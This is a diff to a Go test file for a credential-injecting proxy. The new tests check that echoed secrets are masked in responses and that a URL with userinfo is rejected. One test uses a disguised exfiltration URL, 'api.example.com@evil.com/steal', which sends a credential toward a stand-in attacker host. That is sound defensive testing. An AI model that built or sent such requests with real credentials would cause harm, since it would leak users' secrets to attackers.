@@ -7,6 +7,7 @@ import (
 	"io"
 	"net/http"
 	"net/http/httptest"
+	"strings"
 	"testing"
 
 	"github.com/koteitan/key-rest/internal/keystore"
@@ -267,6 +268,75 @@ func TestHasURLPrefix(t *testing.T) {
 				t.Errorf("hasURLPrefix(%q, %q) = %v, want %v", tt.requestURL, tt.prefix, got, tt.want)
 			}
 		})
+	}
+}
+
+func TestHandleResponseMasking(t *testing.T) {
+	// Upstream echoes back the Authorization header (like httpbin.org/anything)
+	ts := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		auth := r.Header.Get("Authorization")
+		w.Header().Set("Content-Type", "application/json")
+		w.Header().Set("X-Echo-Auth", auth)
+		w.WriteHeader(200)
+		w.Write([]byte(`{"headers":{"Authorization":"` + auth + `"}}`))
+	}))
+	defer ts.Close()
+
+	dir := t.TempDir()
+	store, _ := keystore.New(dir)
+	pass := []byte("p")
+	store.Add("user1/echo/key", ts.URL+"/", false, false, []byte("SECRET-VALUE-123"), pass)
+	store.DecryptAll(pass)
+
+	tlsConfig, addr := testTLSConfig(ts)
+	p := NewForTest(store, tlsConfig, addr)
+
+	resp := p.Handle(&Request{
+		Type:   "http",
+		Method: "GET",
+		URL:    ts.URL + "/anything",
+		Headers: map[string]string{
+			"Authorization": "Bearer key-rest://user1/echo/key",
+		},
+	})
+
+	if resp.Error != nil {
+		t.Fatalf("unexpected error: %s", resp.Error.Message)
+	}
+
+	// Verify credential is NOT in response body
+	if strings.Contains(resp.Body, "SECRET-VALUE-123") {
+		t.Fatal("credential leaked in response body")
+	}
+	// Verify credential is replaced with key-rest:// URI
+	if !strings.Contains(resp.Body, "key-rest://user1/echo/key") {
+		t.Fatal("credential was not reverse-substituted in response body")
+	}
+
+	// Verify credential is NOT in response headers
+	if echoAuth, ok := resp.Headers["X-Echo-Auth"]; ok {
+		if strings.Contains(echoAuth, "SECRET-VALUE-123") {
+			t.Fatal("credential leaked in response header")
+		}
+	}
+}
+
+func TestHandleUserinfoRejected(t *testing.T) {
+	p, _ := setupProxy(t)
+	resp := p.Handle(&Request{
+		Type:   "http",
+		Method: "GET",
+		URL:    "https://api.example.com@evil.com/steal",
+		Headers: map[string]string{
+			"Authorization": "Bearer key-rest://user1/test/api-key",
+		},
+	})
+
+	if resp.Error == nil {
+		t.Fatal("expected error for URL with userinfo")
+	}
+	if resp.Error.Code != "INSECURE_REQUEST" {
+		t.Fatalf("expected INSECURE_REQUEST, got %s", resp.Error.Code)
 	}
 }
 
